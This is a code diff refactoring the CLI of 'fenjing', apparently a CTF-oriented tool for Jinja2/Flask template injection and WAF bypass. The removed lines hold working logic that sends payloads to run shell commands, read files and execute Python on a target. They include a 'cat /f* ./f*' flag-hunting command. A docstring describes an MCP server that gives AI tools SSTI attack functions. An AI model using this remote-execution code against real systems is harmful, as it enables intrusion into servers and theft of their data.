@@ -1,20 +1,15 @@
 """命令行界面的入口"""
 
 import ast
-import base64
-import dataclasses
 import json
 import logging
 import random
 import string
-import re
 import time
 from urllib.parse import urlparse
 from typing import List, Dict, Tuple, Union, Any
 from enum import Enum
-from functools import partial
 from pathlib import Path
-from pprint import pformat
 
 
 from rich.markup import escape as rich_escape
@@ -28,22 +23,7 @@ from .const import (
     ReplacedKeywordStrategy,
     DetectWafKeywords,
     FindFlag,
-    FLASK_CONTEXT_VAR,
-    ATTRIBUTE,
-    ITEM,
-    OS_POPEN_READ,
-    CONFIG,
-    EVAL,
-    STRING,
     DEFAULT_USER_AGENT,
-    RENDER_ERROR_KEYWORDS,
-    GETFLAG_CODE_EVAL,
-)
-from .cracker import (
-    Cracker,
-    EvalArgsModePayloadGen,
-    guess_python_version,
-    guess_is_flask,
 )
 from .form import Form, get_form
 from .full_payload_gen import FullPayloadGen
@@ -56,19 +36,22 @@ from .requester import (
     fix_tail,
 )
 from .submitter import (
-    Submitter,
-    PathSubmitter,
     FormSubmitter,
-    TCPSubmitter,
-    JsonSubmitter,
     shell_tamperer,
-    ExtraParamAndDataCustomizable,
 )
-from .scan_url import yield_form
 from .webui import main as webui_main
-from .interact import interact
 from .options import Options
-from .pbar import pbar_manager, console
+from .pbar import console
+from .job import (
+    Job,
+    FormCrackContext,
+    FormEvalArgsContext,
+    PathCrackContext,
+    JsonCrackContext,
+    ScanContext,
+    RequestCrackContext,
+    RunFailed,
+)
 
 TITLE = r"""
     ____             _ _
@@ -109,10 +92,6 @@ class EnumOption(click.Option):
         return super().type_cast_value(ctx, value)
 
 
-class RunFailed(Exception):
-    """用于通知main和unit test运行失败的exception"""
-
-
 def load_keywords_dotpy_safe(content: str) -> List[str]:
     """安全地从.py文件中读取关键字列表，不使用eval
     自动寻找文件中最长的列表表达式并读取
@@ -151,125 +130,6 @@ def load_keywords_dotpy_safe(content: str) -> List[str]:
         )
         time.sleep(1)
     return result
-
-
-def parse_getflag_info(html: str) -> Union[List[str], None]:
-    flag_re = re.compile(rb"[a-zA-Z0-9-_]{1,10}\{\S{2,100}\}")
-    result_b64 = re.search(r"start([a-zA-Z0-9+/=]+?)stop", html)
-    if not result_b64:
-        logger.warning("Getflag failed, we cannot find anything from this HTML...")
-        print(html)
-        return None
-    try:
-        result = base64.b64decode(result_b64.group(1))
-        return [b.decode() for b in flag_re.findall(result)]
-    except Exception:
-        return None
-
-
-def do_submit_cmdexec(
-    cmd: str,
-    submitter: Submitter,
-    full_payload_gen_like: Union[FullPayloadGen, EvalArgsModePayloadGen],
-) -> str:
-    """使用FullPayloadGen生成shell命令payload, 然后使用submitter发送至对应服务器, 返回回显
-    如果cmd以@开头，则将其作为fenjing内部命令解析
-
-    内部命令如下：
-    - get-config: 获得当前的config
-    - eval: 让目标python进程执行eval，解析命令后面的部分
-
-    Args:
-        cmd (str): payload对应的命令
-        submitter (Submitter): 实际发送请求的submitter
-        full_payload_gen_like (Union[FullPayloadGen, EvalArgsModePayloadGen]):
-            生成payload的FullPayloadGen
-
-    Returns:
-        str: 回显
-    """
-    payload, will_print = None, None
-    is_getflag_requested = False  # 用户是否用@findflag一键梭flag
-    # 解析命令
-    if cmd[0] == "@":
-        cmd = cmd[1:]
-        if cmd.startswith("get-config"):
-            payload, will_print = full_payload_gen_like.generate(CONFIG)
-        elif cmd.startswith("findflag"):
-            if not isinstance(submitter, ExtraParamAndDataCustomizable):
-                logger.warning(
-                    "@findflag is [red bold]not supported[/] for this",
-                )
-                return ""
-            is_getflag_requested = True
-            submitter.set_extra_param("eval_this", GETFLAG_CODE_EVAL)
-            payload, will_print = full_payload_gen_like.generate(
-                EVAL,
-                (
-                    ITEM,
-                    (ATTRIBUTE, (FLASK_CONTEXT_VAR, "request"), "values"),
-                    "eval_this",
-                ),
-            )
-        elif cmd.startswith("eval"):
-            payload, will_print = full_payload_gen_like.generate(
-                EVAL, (STRING, cmd[4:].strip())
-            )
-        elif cmd.startswith("ls"):
-            cmd = cmd.strip()
-            if len(cmd) == 2:  # ls
-                payload, will_print = full_payload_gen_like.generate(
-                    EVAL, (STRING, "__import__('os').listdir()")
-                )
-            else:  # ls xxx
-                payload, will_print = full_payload_gen_like.generate(
-                    EVAL, (STRING, f"__import__('os').listdir({repr(cmd[2:].strip())})")
-                )
-        elif cmd.startswith("cat"):
-            filepath = cmd[3:].strip()
-            payload, will_print = full_payload_gen_like.generate(
-                EVAL, (STRING, f"open({repr(filepath)}, 'r').read()")
-            )
-        elif cmd.startswith("exec"):
-            statements = cmd[4:].strip()
-            payload, will_print = full_payload_gen_like.generate(
-                EVAL, (STRING, f"exec({repr(statements)})")
-            )
-        else:
-            logger.info(
-                "Please check your command",
-                extra={"markup": False, "highlighter": None},
-            )
-            return ""
-    else:
-        payload, will_print = full_payload_gen_like.generate(OS_POPEN_READ, cmd)
-    # 使用payload
-    if payload is None:
-        logger.warning(
-            "[red]Failed[/] generating payload.",
-        )
-        if isinstance(submitter, ExtraParamAndDataCustomizable):
-            submitter.unset_extra_param("eval_this")
-        return ""
-    logger.info(
-        "Submit payload [blue]%s[/]",
-        rich_escape(payload),
-    )
-    if not will_print:
-        logger.warning(
-            "Payload generator says that this payload "
-            "[red]won't print[/] command execution result.",
-        )
-    result = submitter.submit(payload)
-    assert result is not None
-    if is_getflag_requested:
-        flag_data = parse_getflag_info(result.text)
-        if isinstance(submitter, ExtraParamAndDataCustomizable):
-            submitter.unset_extra_param("eval_this")
-        if flag_data:
-            return pformat(flag_data).strip()
-        return "GETFLAG_FAILED"
-    return result.text
 
 
 def parse_headers_cookies(headers_list: List[str], cookies: str) -> Dict[str, str]:
@@ -357,378 +217,6 @@ def is_form_has_response(
             return True
 
     return False
-
-
-def do_crack_form_pre(
-    url: str,
-    form: Form,
-    requester: HTTPRequester,
-    options: Options,
-    tamper_cmd: Union[str, None],
-) -> Union[Tuple[FullPayloadGen, Submitter], None]:
-    """攻击一个表单并获得用于生成payload的参数
-
-    Args:
-        url (str): 目标URL
-        form (Form): 目标表单
-        requester (HTTPRequester): 用于发送请求的requester
-        options (Options): 有关攻击的各个选项
-        tamper_cmd (Union[str, None]): 对payload进行修改的修改命令
-
-    Returns:
-        Union[Tuple[FullPayloadGen, Submitter], None]: 攻击结果
-    """
-    if "127.0.0.1" in url or "localhost" in url:
-        logger.info(
-            "Try out our new feature [cyan bold]crack-keywords[/] with "
-            '[cyan bold]python -m fenjing crack-keywords -k ./app.py -c "ls"[/]!',
-            extra={"markup": True, "highlighter": None},
-        )
-    python_version, python_subversion = (
-        guess_python_version(url, requester)
-        if options.python_version == PythonVersion.UNKNOWN
-        else (options.python_version, None)
-    )
-    for input_field in form["inputs"]:
-        submitter = FormSubmitter(
-            url,
-            form,
-            input_field,
-            requester,
-        )
-        environment = options.environment
-        if options.environment == TemplateEnvironment.JINJA2:
-            # we always doubt lol
-            environment = (
-                TemplateEnvironment.FLASK
-                if guess_is_flask(submitter)
-                else TemplateEnvironment.JINJA2
-            )
-
-        if tamper_cmd:
-            tamperer = shell_tamperer(tamper_cmd)
-            submitter.add_tamperer(tamperer)
-
-        with pbar_manager.progress:
-            cracker = Cracker(
-                submitter=submitter,
-                options=dataclasses.replace(
-                    options,
-                    python_version=python_version,
-                    python_subversion=python_subversion,
-                    environment=environment,
-                ),
-            )
-            if not cracker.has_respond():
-                logger.warning(
-                    "input field [blue]%s[/] has no response",
-                    rich_escape(repr(input_field)),
-                    extra={"markup": True, "highlighter": None},
-                )
-                continue
-            full_payload_gen = cracker.crack()
-        if full_payload_gen:
-            return full_payload_gen, submitter
-    logger.warning(
-        "[red]Didn't see any input that has response. "
-        "Did you forget something like cookies?[/]",
-        extra={"markup": True, "highlighter": None},
-    )
-    return None
-
-
-def do_crack_form_eval_args_pre(
-    url: str,
-    form: Form,
-    requester: HTTPRequester,
-    options: Options,
-    tamper_cmd: Union[str, None],
-) -> Union[Tuple[Submitter, EvalArgsModePayloadGen], None]:
-    """攻击一个表单并获得结果，但是将payload放在GET/POST参数中提交
-
-    Args:
-        url (str): 目标url
-        form (Form): 目标表格
-        requester (HTTPRequester): 提交请求的requester
-        options (Options): 攻击使用的选项
-        tamper_cmd (Union[str, None]): tamper命令
-
-    Returns:
-        Union[Tuple[Submitter, EvalArgsModePayloadGen], None]: 攻击结果
-    """
-    python_version, python_subversion = (
-        guess_python_version(url, requester)
-        if options.python_version == PythonVersion.UNKNOWN
-        else (options.python_version, None)
-    )
-    for input_field in form["inputs"]:
-        submitter = FormSubmitter(
-            url,
-            form,
-            input_field,
-            requester,
-        )
-        environment = options.environment
-        if options.environment == TemplateEnvironment.JINJA2:
-            # we always doubt lol
-            environment = (
-                TemplateEnvironment.FLASK
-                if guess_is_flask(submitter)
-                else TemplateEnvironment.JINJA2
-            )
-
-        if tamper_cmd:
-            tamperer = shell_tamperer(tamper_cmd)
-            submitter.add_tamperer(tamperer)
-        with pbar_manager.progress:
-            cracker = Cracker(
-                submitter=submitter,
-                options=dataclasses.replace(
-                    options,
-                    python_version=python_version,
-                    python_subversion=python_subversion,
-                    environment=environment,
-                ),
-            )
-            if not cracker.has_respond():
-                logger.warning(
-                    "input field [blue]%s[/] has no response",
-                    rich_escape(repr(input_field)),
-                    extra={"markup": True, "highlighter": None},
-                )
-                continue
-            result = cracker.crack_eval_args()
-        if result:
-            submitter2, evalargs_payload_gen = result
-            return submitter2, evalargs_payload_gen
-    logger.warning(
-        "[red]Didn't see any input that has response. "
-        "Did you forget something like cookies? [/]",
-        extra={"markup": True, "highlighter": None},
-    )
-    return None
-
-
-def do_crack_json_pre(
-    url: str,
-    method: str,
-    json_data: str,
-    key: str,
-    requester: HTTPRequester,
-    options: Options,
-    tamper_cmd: Union[str, None],
-) -> Union[Tuple[FullPayloadGen, Submitter], None]:
-    """攻击一个表单并获得用于生成payload的参数
-
-    Args:
-        url (str): 目标URL
-        form (Form): 目标表单
-        requester (HTTPRequester): 用于发送请求的requester
-        options (Options): 有关攻击的各个选项
-        tamper_cmd (Union[str, None]): 对payload进行修改的修改命令
-
-    Returns:
-        Union[Tuple[FullPayloadGen, Submitter], None]: 攻击结果
-    """
-    python_version, python_subversion = (
-        guess_python_version(url, requester)
-        if options.python_version == PythonVersion.UNKNOWN
-        else (options.python_version, None)
-    )
-    json_obj = json.loads(json_data)
-    submitter = JsonSubmitter(
-        url,
-        method,
-        json_obj,
-        key,
-        requester,
-    )
-    if tamper_cmd:
-        tamperer = shell_tamperer(tamper_cmd)
-        submitter.add_tamperer(tamperer)
-    with pbar_manager.progress:
-        if options.environment == TemplateEnvironment.JINJA2:
-            # we always doubt lol
-            environment = (
-                TemplateEnvironment.FLASK
-                if guess_is_flask(submitter)
-                else TemplateEnvironment.JINJA2
-            )
-        else:
-            environment = options.environment
-        cracker = Cracker(
-            submitter=submitter,
-            options=dataclasses.replace(
-                options,
-                environment=environment,
-                python_version=python_version,
-                python_subversion=python_subversion,
-            ),
-        )
-        if not cracker.has_respond():
-            return None
-        full_payload_gen = cracker.crack()
-    if full_payload_gen:
-        return full_payload_gen, submitter
-    return None
-
-
-def do_crack_path_pre(
-    url: str,
-    requester: HTTPRequester,
-    options: Options,
-    tamper_cmd: Union[str, None],
-) -> Union[Tuple[FullPayloadGen, Submitter], None]:
-    """攻击一个路径并获得payload生成器
-
-    Args:
-        url (str): 目标url
-        requester (HTTPRequester): 发送请求的类
-        options (Options): 攻击使用的选项
-        tamper_cmd (Union[str, None]): tamper命令
-
-    Returns:
-        Union[Tuple[FullPayloadGen, Submitter], None]: 攻击结果
-    """
-    python_version, python_subversion = (
-        guess_python_version(url, requester)
-        if options.python_version == PythonVersion.UNKNOWN
-        else (options.python_version, None)
-    )
-    submitter = PathSubmitter(url=url, requester=requester)
-    if tamper_cmd:
-        tamperer = shell_tamperer(tamper_cmd)
-        submitter.add_tamperer(tamperer)
-    with pbar_manager.progress:
-        if options.environment == TemplateEnvironment.JINJA2:
-            # we always doubt lol
-            environment = (
-                TemplateEnvironment.FLASK
-                if guess_is_flask(submitter)
-                else TemplateEnvironment.JINJA2
-            )
-        else:
-            environment = options.environment
-        cracker = Cracker(
-            submitter=submitter,
-            options=dataclasses.replace(
-                options,
-                environment=environment,
-                python_version=python_version,
-                python_subversion=python_subversion,
-            ),
-        )
-        if not cracker.has_respond():
-            return None
-        full_payload_gen = cracker.crack()
-    if full_payload_gen is None:
-        return None
-    return full_payload_gen, submitter
-
-
-def do_crack_request_pre(
-    submitter: TCPSubmitter,
-    options: Options,
-) -> Union[FullPayloadGen, None]:
-    """根据指定的请求文件进行攻击并获得结果
-
-    Args:
-        submitter (TCPSubmitter): 发送payload的类
-        options (Options): 攻击使用的选项
-
-    Returns:
-        Union[FullPayloadGen, None]: 攻击结果
-    """
-    with pbar_manager.progress:
-        cracker = Cracker(submitter=submitter, options=options)
-        if not cracker.has_respond():
-            return None
-        full_payload_gen = cracker.crack()
-    if full_payload_gen is None:
-        return None
-    return full_payload_gen
-
-
-def do_crack(
-    full_payload_gen: FullPayloadGen,
-    submitter: Submitter,
-    exec_cmd: Union[str, None],
-    find_flag: FindFlag,
-):
-    """使用payload生成器攻击对应的表单参数/路径
-
-    Args:
-        full_payload_gen (FullPayloadGen): payload生成器
-        submitter (Submitter): payload提交器，用于提交payload到特定的表单/路径
-        exec_cmd (Union[str, None]): 需要执行的命令
-    """
-    cmd_exec_func = partial(
-        do_submit_cmdexec,
-        submitter=submitter,
-        full_payload_gen_like=full_payload_gen,
-    )
-    is_find_flag_enabled = find_flag == FindFlag.ENABLED
-    if find_flag == FindFlag.AUTO:
-        test_string = repr('"generate_me": os.popen("cat /f* ./f*").read(),')
-        payload, will_print = full_payload_gen.generate(STRING, test_string)
-        if payload is None or not will_print:
-            is_find_flag_enabled = False
-        elif len(payload) >= len(test_string) * 5:
-            logger.info(
-                "[yellow]Payload for finding flag "
-                "is too long, we decide not to submit it[/]",
-            )
-            is_find_flag_enabled = False
-        else:
-            is_find_flag_enabled = True
-
-    if isinstance(submitter, ExtraParamAndDataCustomizable) and is_find_flag_enabled:
-        logger.info(
-            "[yellow]Searching flags...[/]",
-        )
-        getflag_result = cmd_exec_func("@findflag")
-        if getflag_result and getflag_result != "GETFLAG_FAILED":
-            logger.info("This might be your [cyan bold]flag[/]:")
-            logger.info(getflag_result)
-            logger.info("No thanks.")
-            time.sleep(3)
-        else:
-            logger.info("I cannot find flag for you... but")
-            logger.info("Bypass WAF [green bold]success[/]")
-
-    if exec_cmd:
-        result = cmd_exec_func(exec_cmd)
-        print(result)
-        if any(keyword in result for keyword in RENDER_ERROR_KEYWORDS):
-            raise RunFailed()
-    else:
-        interact(cmd_exec_func)
-
-
-def do_crack_eval_args(
-    submitter: Submitter,
-    eval_args_payloadgen: EvalArgsModePayloadGen,
-    exec_cmd: Union[str, None],
-    find_flag: FindFlag
-):
-    """攻击对应的表单参数/路径，但是使用eval_args方法
-
-    Args:
-        submitter (Submitter): payload提交器，用于提交payload到特定的表单/路径
-        eval_args_payloadgen (EvalArgsModePayloadGen): EvalArgs的payload生成器
-        exec_cmd (Union[str, None]): 需要执行的命令
-    """
-    cmd_exec_func = partial(
-        do_submit_cmdexec,
-        submitter=submitter,
-        full_payload_gen_like=eval_args_payloadgen,
-    )
-    if find_flag != FindFlag.DISABLED:
-        print(cmd_exec_func("@findflag"))
-    if exec_cmd:
-        print(cmd_exec_func(exec_cmd))
-    else:
-        interact(cmd_exec_func)
 
 
 common_options_cli = [
@@ -894,46 +382,37 @@ def crack(
         proxy=proxy,
         no_verify_ssl=no_verify_ssl,
     )
+    # 创建选项对象
+    options = Options(
+        detect_mode=detect_mode,
+        replaced_keyword_strategy=replaced_keyword_strategy,
+        environment=environment,
+        detect_waf_keywords=detect_waf_keywords,
+        waf_keywords=waf_keyword,
+    )
+
     if not eval_args_payload:
-        result = do_crack_form_pre(
-            url,
-            form,
-            requester,
-            Options(
-                detect_mode=detect_mode,
-                replaced_keyword_strategy=replaced_keyword_strategy,
-                environment=environment,
-                detect_waf_keywords=detect_waf_keywords,
-                waf_keywords=waf_keyword,
-            ),
-            tamper_cmd,
+        context = FormCrackContext(
+            url=url,
+            form=form,
+            requester=requester,
+            options=options,
+            tamper_cmd=tamper_cmd,
         )
-        if not result:
-            logger.warning("Test form failed...", extra={"highlighter": None})
-            raise RunFailed()
-        full_payload_gen, submitter = result
-        do_crack(full_payload_gen, submitter, exec_cmd, find_flag)
     else:
-        # pylance is not happy about using same variable name
-        # that's why we use result'2' here.
-        result2 = do_crack_form_eval_args_pre(
-            url,
-            form,
-            requester,
-            Options(
-                detect_mode=detect_mode,
-                replaced_keyword_strategy=replaced_keyword_strategy,
-                environment=environment,
-                detect_waf_keywords=detect_waf_keywords,
-                waf_keywords=waf_keyword,
-            ),
-            tamper_cmd,
+        context = FormEvalArgsContext(
+            url=url,
+            form=form,
+            requester=requester,
+            options=options,
+            tamper_cmd=tamper_cmd,
         )
-        if not result2:
-            logger.warning("Test form failed...", extra={"highlighter": None})
-            raise RunFailed()
-        submitter, evalargs_payload_gen = result2
-        do_crack_eval_args(submitter, evalargs_payload_gen, exec_cmd, find_flag)
+
+    job = Job(context)
+    if not job.do_crack_pre():
+        logger.warning("Test form failed...", extra={"highlighter": None})
+        raise RunFailed()
+    job.do_crack(exec_cmd, find_flag)
 
 
 @main.command()
@@ -972,23 +451,24 @@ def crack_path(
         proxy=proxy,
         no_verify_ssl=no_verify_ssl,
     )
-    result = do_crack_path_pre(
-        url,
-        requester,
-        Options(
-            detect_mode=detect_mode,
-            replaced_keyword_strategy=replaced_keyword_strategy,
-            environment=environment,
-            detect_waf_keywords=detect_waf_keywords,
-            waf_keywords=waf_keyword,
-        ),
-        tamper_cmd,
+    options = Options(
+        detect_mode=detect_mode,
+        replaced_keyword_strategy=replaced_keyword_strategy,
+        environment=environment,
+        detect_waf_keywords=detect_waf_keywords,
+        waf_keywords=waf_keyword,
     )
-    if not result:
+    context = PathCrackContext(
+        url=url,
+        requester=requester,
+        options=options,
+        tamper_cmd=tamper_cmd,
+    )
+    job = Job(context)
+    if not job.do_crack_pre():
         logger.warning("Test form failed...", extra={"highlighter": None})
         raise RunFailed()
-    full_payload_gen, submitter = result
-    do_crack(full_payload_gen, submitter, exec_cmd, find_flag)
+    job.do_crack(exec_cmd, find_flag)
 
 
 @main.command()
@@ -1033,26 +513,27 @@ def crack_json(
         proxy=proxy,
         no_verify_ssl=no_verify_ssl,
     )
-    result = do_crack_json_pre(
-        url,
-        method,
-        json_data,
-        key,
-        requester,
-        Options(
-            detect_mode=detect_mode,
-            replaced_keyword_strategy=replaced_keyword_strategy,
-            environment=environment,
-            detect_waf_keywords=detect_waf_keywords,
-            waf_keywords=waf_keyword,
-        ),
-        tamper_cmd,
+    options = Options(
+        detect_mode=detect_mode,
+        replaced_keyword_strategy=replaced_keyword_strategy,
+        environment=environment,
+        detect_waf_keywords=detect_waf_keywords,
+        waf_keywords=waf_keyword,
     )
-    if not result:
+    context = JsonCrackContext(
+        url=url,
+        method=method,
+        json_data=json_data,
+        key=key,
+        requester=requester,
+        options=options,
+        tamper_cmd=tamper_cmd,
+    )
+    job = Job(context)
+    if not job.do_crack_pre():
         logger.warning("Test form failed...", extra={"highlighter": None})
         raise RunFailed()
-    full_payload_gen, submitter = result
-    do_crack(full_payload_gen, submitter, exec_cmd, find_flag)
+    job.do_crack(exec_cmd, find_flag)
 
 
 @main.command()
@@ -1097,45 +578,23 @@ def scan(
         detect_waf_keywords=detect_waf_keywords,
         waf_keywords=waf_keyword,
     )
-    url_forms = [
-        (page_url, form)
-        for i, (page_url, forms) in enumerate(yield_form(requester, url))
-        for form in forms
-        if i < 100
-    ]
-
-    url_forms.sort(
-        key=(
-            lambda item: is_form_has_response(
-                url=item[0], form=item[1], requester=requester, tamper_cmd=tamper_cmd
-            )
-        ),
-        reverse=True,
+    context = ScanContext(
+        url=url,
+        requester=requester,
+        options=options,
+        tamper_cmd=tamper_cmd,
     )
-
-    for page_url, form in url_forms:
-        logger.warning("Scan form: %s", repr(form), extra={"highlighter": None})
-        result = do_crack_form_pre(
-            page_url,
-            form,
-            requester,
-            options,
-            tamper_cmd,
+    job = Job(context)
+    if not job.do_crack_pre():
+        logger.warning("Scan failed...", extra={"highlighter": None})
+        logger.warning(
+            "Try to pass params manualy: "
+            + "python -m fenjing crack %s --inputs aaa,bbb --method GET",
+            url,
+            extra={"highlighter": None},
         )
-        if not result:
-            continue
-        full_payload_gen, submitter = result
-        do_crack(full_payload_gen, submitter, exec_cmd, find_flag)
-        return
-    logger.warning("Scan failed...", extra={"highlighter": None})
-    logger.warning(
-        "Try to pass params manualy: "
-        + "python -m fenjing crack %s --inputs aaa,bbb --method GET",
-        url,
-        extra={"highlighter": None},
-    )
-
-    raise RunFailed()
+        raise RunFailed()
+    job.do_crack(exec_cmd, find_flag)
 
 
 @main.command()
@@ -1207,30 +666,32 @@ def crack_request(
     requester = TCPRequester(
         host=host, port=port, use_ssl=ssl, retry_times=retry_times, interval=interval
     )
-    submitter = TCPSubmitter(
+    options = Options(
+        detect_mode=detect_mode,
+        replaced_keyword_strategy=replaced_keyword_strategy,
+        environment=environment,
+        detect_waf_keywords=detect_waf_keywords,
+        waf_keywords=waf_keyword,
+    )
+    context = RequestCrackContext(
+        host=host,
+        port=port,
+        request_file=request_file,
         requester=requester,
-        pattern=request_pattern,
+        options=options,
+        tamper_cmd=tamper_cmd,
         toreplace=toreplace,
+        ssl=ssl,
         urlencode_payload=urlencode_payload,
-        enable_update_content_length=update_content_length,
+        raw=raw,
+        retry_times=retry_times,
+        update_content_length=update_content_length,
     )
-    if tamper_cmd:
-        tamperer = shell_tamperer(tamper_cmd)
-        submitter.add_tamperer(tamperer)
-    full_payload_gen = do_crack_request_pre(
-        submitter=submitter,
-        options=Options(
-            detect_mode=detect_mode,
-            replaced_keyword_strategy=replaced_keyword_strategy,
-            environment=environment,
-            detect_waf_keywords=detect_waf_keywords,
-            waf_keywords=waf_keyword,
-        ),
-    )
-    if not full_payload_gen:
+    job = Job(context)
+    if not job.do_crack_pre():
         logger.warning("Crack request failed...", extra={"highlighter": None})
         raise RunFailed()
-    do_crack(full_payload_gen, submitter, exec_cmd, find_flag)
+    job.do_crack(exec_cmd, find_flag)
 
 
 @main.command()
@@ -1391,13 +852,13 @@ def webui(host, port, open_browser):
 def mcp():
     """
     启动fenjing MCP服务器，为AI工具提供SSTI攻击功能
-    
+
     通过Model Context Protocol (MCP)提供以下工具：
     - crack: 执行SSTI攻击
     - crack_path: 执行路径型SSTI攻击
     - session_execute_command: 在攻击会话中执行命令
     - session_generate_payload: 生成shell命令对应的payload
-    
+
     示例用法:
       fenjing mcp
     """
